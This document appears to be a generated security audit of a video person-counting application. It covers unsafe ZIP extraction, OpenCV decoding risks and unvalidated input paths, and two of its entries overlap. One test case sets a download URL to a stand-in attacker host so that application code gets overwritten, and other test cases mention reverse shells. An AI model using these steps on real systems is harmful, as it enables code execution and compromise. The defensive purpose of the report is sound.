## Combined Vulnerability List

### 1. ZIP Extraction Vulnerability via Malicious `load_weights_url`

- **Description:**
  1. An attacker with the ability to modify the `agamotto.yaml` configuration file changes the `model.load_weights_url` parameter to point to a malicious ZIP archive hosted on an attacker-controlled server.
  2. The Agamotto application starts or reloads its configuration from the modified `agamotto.yaml`.
  3. During the application startup, the `Agamotto.download_weights()` function is executed. This function retrieves the `load_weights_url` from the configuration.
  4. The application constructs a download URL using the attacker-specified `model.load_weights_url`, `model.load_weights_version`, and `load_weights_dir`.
  5. The application then downloads the ZIP archive from the malicious URL using `keras.utils.get_file()`.
  6. After downloading, the application extracts the contents of the ZIP archive to the current working directory (`./`) using `zipfile.ZipFile.extractall("./")`.
  7. If the malicious ZIP archive is crafted to contain files that overwrite existing application files (e.g., `main.py`, `agamotto/agamotto.py`, libraries, configuration files) or introduce new malicious files (e.g., scripts, executables) into locations where they can be executed or accessed by the application, the attacker can compromise the application.

- **Impact:**
  - Remote Code Execution: By overwriting application code with malicious code, the attacker can achieve arbitrary code execution within the context of the Agamotto application.
  - Application Compromise: The attacker can compromise the integrity and functionality of the Agamotto application by replacing legitimate components with malicious ones, potentially leading to data breaches, unauthorized access, or denial of service.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - None. The provided code does not implement any input validation, integrity checks, or secure extraction mechanisms for the downloaded weights.

- **Missing Mitigations:**
  - Input validation for `model.load_weights_url`: Implement a whitelist of allowed, trusted domains or URLs for `model.load_weights_url` in `agamotto.yaml`. Alternatively, use a more robust method to verify the source and integrity of the download location.
  - Integrity check for downloaded ZIP file: Before extracting the ZIP archive, implement a mechanism to verify its integrity. This could involve checking a checksum (like SHA256 hash) or a digital signature of the ZIP file against a known trusted value.
  - Secure ZIP extraction: Instead of extracting directly to the application's root directory, extract the ZIP archive to a temporary, isolated directory. Then, carefully copy only the expected weight files to their intended locations, avoiding overwriting any other application files. Consider using secure extraction methods that prevent directory traversal vulnerabilities within ZIP archives.
  - Principle of least privilege: Run the Agamotto application with the minimal necessary permissions. This can limit the impact of a successful ZIP extraction vulnerability by restricting what actions a compromised application can perform on the system.

- **Preconditions:**
  - The attacker must have the ability to modify the `agamotto.yaml` configuration file. This could be achieved if the configuration file is stored in a publicly accessible location, if there is another vulnerability that allows file modification, or if the attacker can convince an administrator to use a malicious configuration file.
  - The Agamotto application must be configured to download weights (which is the default behavior as per `agamotto.yaml`).

- **Source Code Analysis:**
  - File: `/code/agamotto/agamotto/agamotto.py`
  ```python
  def download_weights(self):
      """
      Downloading weights for first (or only) executions, it will download, extract and create
      a folder based on agamotto.yaml file.
      """
      url = f"{self._model_load_weights_url}/{self._model_load_weights_version}/{self._load_weights_dir}.zip"
      filename = os.path.join(os.getcwd(), f"{self._load_weights_dir}.zip")
      keras.utils.get_file(filename, url)
      with zipfile.ZipFile(f"{self._load_weights_dir}.zip", "r") as z_fp:
          z_fp.extractall("./")
  ```
  - The `download_weights` function in the `Agamotto` class constructs a URL using configuration parameters `_model_load_weights_url`, `_model_load_weights_version`, and `_load_weights_dir`, all of which are derived from the `agamotto.yaml` configuration file.
  - The function uses `keras.utils.get_file()` to download the ZIP archive from the constructed URL. Critically, it then uses `zipfile.ZipFile.extractall("./")` to extract the downloaded archive directly into the current working directory of the application without any validation or security checks.
  - There is no input validation on `_model_load_weights_url` or any of the related configuration parameters that contribute to the download URL.
  - The use of `extractall("./")` is inherently risky as it extracts all files from the archive to the current directory, which can lead to overwriting existing files if the ZIP archive is maliciously crafted.

- **Security Test Case:**
  1. **Prepare a malicious ZIP archive:** Create a ZIP file named `malicious_weights.zip`. Inside this ZIP file, create a directory structure that, when extracted to the application's root directory (`/code/agamotto` inside the container, assuming this is the working directory when `download_weights` is called), will overwrite the `agamotto/main.py` file. For example, the ZIP could contain the path `agamotto/main.py` with malicious content. The malicious `agamotto/main.py` can be a simple script that prints "Vulnerable!" and then exits.
  ```python
  # Malicious main.py content (example)
  print("Vulnerable!")
  exit()
  ```
  Zip this modified `main.py` and place it in the path `agamotto/main.py` inside the zip archive.
  2. **Host the malicious ZIP archive:** Set up a simple HTTP server (e.g., using Python's `http.server`) to host the `malicious_weights.zip` file. Let's assume the server is running on `http://attacker.com` and `malicious_weights.zip` is accessible at `http://attacker.com/malicious_weights.zip`.
  3. **Modify `agamotto.yaml`:** Edit the `agamotto.yaml` file located in the `/code/agamotto/` directory of the project to use the malicious URL:
  ```yaml
  model:
    load_weights_url: http://attacker.com
    load_weights_version: .
    load_weights_dir: malicious_weights
  ```
  4. **Run the Agamotto application:** Build and start the Agamotto application using Docker Compose: `docker-compose up --build`.
  5. **Observe the output:** Check the logs of the `agamotto` container. If the vulnerability is successfully exploited, the application's behavior will be altered. In this test case, if `agamotto/main.py` was successfully overwritten with the malicious version, the container logs should show "Vulnerable!" printed to the console, or the application might fail to start or behave unexpectedly because of the replaced `main.py`. If the application prints "Vulnerable!" instead of its normal startup messages, it confirms that code execution was achieved by overwriting `main.py` through the ZIP extraction vulnerability.

### 2. Potential OpenCV Video Processing Vulnerability (Indirect)

- **Description:**
    1. Agamotto utilizes OpenCV's `cv2.VideoCapture` to process video files and streams, as configured by the `input_location` parameter in `agamotto.yaml`.
    2. OpenCV, being a complex C/C++ library, is susceptible to vulnerabilities such as buffer overflows, format string bugs, or integer overflows when handling various video codecs and file formats.
    3. An attacker could craft a malicious video file or stream specifically designed to exploit a known or zero-day vulnerability within OpenCV's video decoding or processing functionalities.
    4. When Agamotto processes this maliciously crafted video through `cv2.VideoCapture`, the underlying vulnerability in OpenCV could be triggered.
    5. Successful exploitation of such a vulnerability could lead to arbitrary code execution on the system running Agamotto, depending on the nature and severity of the OpenCV vulnerability.

- **Impact:**
    - Arbitrary code execution on the system hosting the Agamotto application. This could allow an attacker to gain full control over the system, steal sensitive data, or use the system for further malicious activities.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None specifically within the Agamotto project code.
    - The Dockerfile includes `apt-get update` and `apt-get install ffmpeg libsm6 libxext6 -y`, which may update system libraries including OpenCV to the latest versions available in the Debian Buster repositories at the time of Docker image build. However, this does not guarantee protection against zero-day vulnerabilities in OpenCV, or vulnerabilities present in the version available in the repositories.

- **Missing Mitigations:**
    - Input validation: Agamotto lacks any explicit validation of the `input_location` (video file path or stream URL) or the content of the video files/streams it processes. This means any input accepted by `cv2.VideoCapture` is processed without further checks.
    - Security scanning for dependencies: The project does not include any security scanning or vulnerability assessment for its dependencies, particularly OpenCV.
    - Sandboxing/Isolation: While Docker provides a degree of containerization, it's not a robust security sandbox specifically designed to mitigate code execution vulnerabilities in underlying libraries like OpenCV. Deeper sandboxing mechanisms could limit the impact of a successful exploit.
    - Regular OpenCV updates and vulnerability monitoring: The project should implement a process for actively monitoring OpenCV security advisories and promptly updating to patched versions.

- **Preconditions:**
    - For video file processing (when `video.is_stream` is `False`): The attacker needs to be able to replace or influence the video file used by Agamotto, as defined by `video.input_location` in `agamotto.yaml`. In the default setup, this is `video.mp4` in the `agamotto` directory.
    - For video stream processing (when `video.is_stream` is `True`): The attacker needs to control or influence the video stream source URL specified in `video.input_location` in `agamotto.yaml`.
    - In both scenarios, the attacker needs to be able to provide a malicious video file or stream that triggers a vulnerability in the version of OpenCV used by Agamotto.

- **Source Code Analysis:**
    - `/agamotto/agamotto/agamotto.py`:
        - `process_media(path)` function is called with `config["video"]["input_location"]` as `path`.
        - Inside `process_media`, `process_video(video_path)` or `process_stream(stream_path)` is called based on `self._video_is_stream`.
        - Both `process_video` and `process_stream` use `cv2.VideoCapture(video_path)` or `cv2.VideoCapture(stream_path)` respectively to open the video source.
        - The `video_path` and `stream_path` are directly derived from the configuration file without any sanitization or validation within Agamotto's code.
    - `/agamotto/agamotto.yaml`:
        - `video:` section contains `input_location` which is directly used to initialize `cv2.VideoCapture`.
        - Example: `video.input_location: "video.mp4"` or `video.input_location: "http://127.0.0.1:9098/video_feed"`.
    - No code exists within Agamotto to validate the `input_location` or to perform security checks on the video files or streams before processing them with OpenCV.

- **Security Test Case:**
    1. **Preparation of Malicious Video:** Obtain or create a malicious video file (`malicious.mp4`) specifically crafted to exploit a known vulnerability in the version of OpenCV that Agamotto is likely to use. This might involve researching public OpenCV vulnerabilities and creating a video that triggers a buffer overflow, heap corruption, or other exploitable condition. (Note: Creating such a file requires specialized security expertise and is for testing purposes only in a controlled environment.)
    2. **Replace Default Video (if testing video file processing):** Navigate to the `agamotto` directory within the project repository and replace the default `video.mp4` file with the prepared `malicious.mp4` file.
    3. **Build and Run Agamotto:** Build and run the Agamotto Docker container using the commands provided in the README.md:
        ```shell
        cd agamotto
        docker build --no-cache . -t agamotto-model
        docker run --name agamotto_container agamotto-model:latest
        ```
    4. **Monitor for Exploitation Indicators:** Observe the output and logs of the Docker container. Look for signs of a crash, unexpected errors, or abnormal behavior during video processing, which might indicate that the malicious video has triggered a vulnerability in OpenCV.
    5. **Advanced Exploitation Confirmation (Optional, Requires Expertise):** For more advanced testing, and if the nature of the OpenCV vulnerability allows, attempt to craft the `malicious.mp4` to perform a specific action upon successful exploitation, such as creating a file in a known location within the container's filesystem or attempting a reverse shell connection. Success of such actions would strongly confirm arbitrary code execution.
    6. **Compare with Benign Video:** Repeat steps 2-4 using a benign video file to ensure that the observed behavior is specific to the `malicious.mp4` and not a general processing issue with all videos.
    7. **Analyze Crash (If Applicable):** If a crash occurs, analyze the error logs and any core dumps (if generated) to confirm that the crash originates from within OpenCV's video processing modules and is consistent with the expected behavior of the targeted vulnerability.


### 3. Unvalidated Video Input Path

- **Description:**
    1. The Agamotto application reads the video input location (either a video file path or a stream URL) directly from the `agamotto.yaml` configuration file, specifically the `video.input_location` parameter.
    2. The `agamotto.process_media` function in `/code/agamotto/agamotto/agamotto.py` uses this unvalidated path directly in `cv2.VideoCapture()` without any sanitization or validation.
    3. If an attacker can modify the `agamotto.yaml` file or control the input to the `process_media` function, they can supply a malicious video path or stream URL.
    4. By providing a path to a crafted video file or stream, the attacker can inject manipulated video frames into the Agamotto processing pipeline.
    5. This allows the attacker to control the person count detected by Agamotto, artificially inflating or deflating the reported numbers.
    6. For example, an attacker could replace the legitimate video input with a pre-recorded video that always shows a high number of people, regardless of the actual occupancy of the monitored location.

- **Impact:**
    - **Data Manipulation:** Attackers can manipulate the person count data collected by Agamotto.
    - **Misleading Marketing Insights:** Skewed person count data leads to inaccurate marketing campaign analysis and potentially flawed business decisions based on this data.
    - **Reputational Damage:** If the manipulation is discovered, it can damage the credibility of the marketing insights and the Agamotto system itself.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The application directly uses the input path from the configuration without any validation.

- **Missing Mitigations:**
    - **Input Validation and Sanitization:** Implement validation to ensure that the video input path is from an expected and trusted source. For file paths, verify the file extension and possibly the file's integrity (e.g., using checksums if applicable). For stream URLs, implement a whitelist of allowed domains or protocols.
    - **Access Control for Configuration Files:** Restrict access to the `agamotto.yaml` configuration file to prevent unauthorized modification. Ensure that only authorized personnel can modify the configuration.
    - **Principle of Least Privilege:** Run the Agamotto application with minimal necessary privileges to limit the impact of potential exploits.

- **Preconditions:**
    - The attacker needs to be able to modify the `agamotto.yaml` configuration file or control the input to the `process_media` function.  For an external attacker this might be possible through exploiting other vulnerabilities that allow file modification or influencing configuration through exposed APIs (if any were added later and are not in provided files). For now, assuming direct access to configuration file is the most straightforward precondition within the scope of provided files.

- **Source Code Analysis:**
    1. **`/code/agamotto/main.py`**:
        ```python
        if __name__ == "__main__":
            config = read_from_yaml()
            # ...
            agamotto = Agamotto(config)
            agamotto.process_media(config["video"]["input_location"])
        ```
        - The `main.py` script reads the configuration from `agamotto.yaml` using `read_from_yaml()`.
        - It then creates an `Agamotto` object and calls `process_media()` with `config["video"]["input_location"]`.

    2. **`/code/agamotto/agamotto/agamotto.py`**:
        ```python
        class Agamotto:
            # ...
            def process_media(self, path):
                """Process media defines which media it will be used

                Args:
                    path (str): Media path format in string
                """
                if self._video_is_stream:
                    self.process_stream(path)
                else:
                    self.process_video(path)

            def process_video(self, video_path):
                """Process video reads the video_path and generate a video output
                ...
                Args:
                    video_path (str): Video Path
                """
                player = cv2.VideoCapture(video_path) # Vulnerability: video_path is directly from config
                # ...

            def process_stream(self, stream_path):
                """Process the stream and send stdout to container output
                ...
                Args:
                    stream_path (str): Stream path url (usually http - see OpenCV Types)
                """
                while True:
                    # ...
                    player = cv2.VideoCapture(stream_path) # Vulnerability: stream_path is directly from config
                    # ...
        ```
        - The `Agamotto.process_media` function receives the `path` (which is `config["video"]["input_location"]` from `main.py`).
        - It then calls either `process_video` or `process_stream`, passing the `path` as `video_path` or `stream_path` respectively.
        - **Crucially, in both `process_video` and `process_stream`, the `video_path` and `stream_path` variables, which originate from the user-controlled configuration file, are directly passed to `cv2.VideoCapture()` without any validation or sanitization.** This is where the vulnerability lies.

    3. **`/code/agamotto/utils/read_from_yaml.py`**:
        ```python
        def read_from_yaml(file_name = "agamotto.yaml"):
            logger().info("Attempting to read YAML: agamotto.yaml")
            try:
                with open(file_name) as f:
                    data = yaml.load(f, Loader=SafeLoader)
                logger().debug("Read yaml with data: "+ str(data))
                return data
            except Exception as ex:
                logger().error("Error when attempting to read yaml: " + str(ex))
                raise ex
        ```
        - This function simply reads and parses the YAML file. It does not perform any validation on the content of the YAML file, including the `input_location`.

- **Security Test Case:**
    1. **Pre-requisite:** Access to the `agamotto.yaml` file or a mechanism to modify its content (e.g., in a deployed environment, this might be through configuration management tools, or if there's a vulnerability allowing file writes). Assume for this test case direct access to `agamotto.yaml`.
    2. **Prepare a Malicious Video File:** Create a video file (e.g., `malicious_video.mp4`) that contains pre-recorded frames showing a consistently high count of people (or any count the attacker wants to inject). This could be as simple as recording a short video of a crowded scene. Place this file in a location accessible to the Agamotto application container or instance, for simplicity assume same directory as `agamotto.yaml` in the test setup.
    3. **Modify `agamotto.yaml`:**
        - Open the `agamotto.yaml` file.
        - Change the `video.input_location` parameter to point to the malicious video file created in step 2. For example:
          ```yaml
          video:
            input_location: "malicious_video.mp4" # Changed to malicious video
            write_output_fps: 5
            read_interval: 1
            output_location: "output_malicious.avi" # Change output location to differentiate
            is_stream: False
          ```
        - Ensure `video.is_stream` is set to `False` as we are using a video file in this test.
        - Save the modified `agamotto.yaml` file.
    4. **Run Agamotto:** Start the Agamotto application using the modified `agamotto.yaml` configuration, for example using the provided docker commands:
        ```shell
        cd agamotto
        docker build --no-cache . -t agamotto-model-test
        docker run --name agamotto_container_test agamotto-model-test:latest
        ```
    5. **Observe the Output:**
        - Check the output video (e.g., `output_malicious.avi` inside the container, copy it out using `docker cp agamotto_container_test:/usr/src/app/output_malicious.avi .`).
        - Analyze the person count in the output video or any logs produced by Agamotto (if logging the count).
        - **Expected Result:** Agamotto should report a person count based on the manipulated content of `malicious_video.mp4`, not the actual live scene or intended video input. If `malicious_video.mp4` was crafted to show high counts, Agamotto will incorrectly report high person counts, demonstrating the vulnerability.


### 4. OpenCV Memory Corruption Vulnerability via Malicious Video Stream

- **Description:**
    - The Agamotto application utilizes OpenCV to process video streams and files for person counting.
    - By providing a maliciously crafted video stream or video file as input, an attacker can exploit potential memory corruption vulnerabilities within OpenCV's video decoding or processing functions.
    - This can be achieved by manipulating the `input_location` parameter in the `agamotto.yaml` configuration file to point to a malicious video source.
    - When Agamotto processes this malicious video through OpenCV, it may trigger a memory corruption vulnerability due to flaws in OpenCV's handling of specific video codecs, container formats, or malformed video data.

- **Impact:**
    - Remote Code Execution (RCE).
    - Successful exploitation could allow an attacker to execute arbitrary code on the system running the Agamotto application.
    - This could lead to a complete compromise of the system, including data theft, malware installation, or denial of service.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The code directly uses OpenCV to process video input without any explicit input validation or security measures.

- **Missing Mitigations:**
    - Input validation and sanitization for video streams and files to ensure they conform to expected formats and do not contain malicious payloads.
    - Sandboxing the video processing: Running the OpenCV video processing in a sandboxed environment to limit the impact of a potential exploit.
    - Regular updates of OpenCV: Keeping the OpenCV library updated to the latest version to patch known vulnerabilities.
    - Memory safety measures: Employing memory safety techniques and compiler flags during the build process to mitigate memory corruption issues.

- **Preconditions:**
    - The Agamotto application must be deployed and running.
    - The attacker must be able to provide a malicious video stream URL or video file path to the application. This could be achieved by:
        - Modifying the `agamotto.yaml` configuration file if the attacker has write access to it (less likely for an external attacker).
        - Providing a malicious URL if the application is configured to process a stream from a user-provided URL (not directly supported in the provided configuration, but a potential future feature or misconfiguration).
        - Tricking an administrator into placing a malicious video file in a location that the application processes.

- **Source Code Analysis:**
    - `agamotto/agamotto/agamotto.py`:
        - `process_media(self, path)` function is responsible for selecting video processing method based on `self._video_is_stream`.
        - `process_stream(self, stream_path)` and `process_video(self, video_path)` functions use `cv2.VideoCapture()` to open the video source specified by `stream_path` and `video_path` respectively. These paths are directly derived from the configuration file (`agamotto.yaml`) under `video.input_location`.
        - No input validation or sanitization is performed on `stream_path` or `video_path` before passing them to `cv2.VideoCapture()`.
    - `stream/video.py`:
        - `Video.__init__(self)` initializes `self.video = cv2.VideoCapture(0)`. While this part handles the webcam stream for the `stream` service, the primary vulnerability vector targets the `agamotto` service processing external video sources defined in `agamotto.yaml`.
    - `agamotto/utils/read_from_yaml.py`:
        - `read_from_yaml(file_name = "agamotto.yaml")` function reads the configuration from `agamotto.yaml`. This configuration, including `video.input_location`, is directly used by `agamotto.py` without validation.

- **Security Test Case:**
    - **Setup:**
        - Deploy Agamotto using Docker as described in the `README.md`. Ensure the application is running.
        - Prepare a malicious video file that is designed to trigger a known vulnerability in OpenCV (e.g., a crafted MP4 or AVI file exploiting a parsing flaw). Tools like Medusa fuzzer or online resources for known OpenCV exploit samples can be used to obtain or create such a file.
    - **Configuration:**
        - Modify the `agamotto/agamotto/agamotto.yaml` file within the running Docker container or before building the Docker image.
        - Change the `video.is_stream` value to `False`.
        - Change the `video.input_location` value to the path where the malicious video file will be accessible within the container. For example, if you copy the malicious video file named `malicious.mp4` into the `/code/agamotto/` directory within the container, set `video.input_location: "malicious.mp4"`. You might need to use `docker cp` to copy the file into the container.
    - **Execution:**
        - Restart the `agamotto` container to apply the configuration changes.
        - Observe the behavior of the `agamotto` container.
    - **Verification:**
        - Check the Docker container logs for the `agamotto` service using `docker logs <agamotto_container_name>`.
        - Look for signs of a crash, error messages related to OpenCV, or unexpected program termination. A successful exploit might lead to a segmentation fault or other abnormal termination.
        - For more advanced verification, attempt to detect if remote code execution is possible. This would involve crafting a more sophisticated malicious video designed to execute specific commands upon exploitation and monitoring for those commands' effects (e.g., network connections to an attacker-controlled server, file creation, etc.).
        - If the application crashes or exhibits abnormal behavior when processing the malicious video, and this behavior is not observed with benign video files, it indicates a potential vulnerability.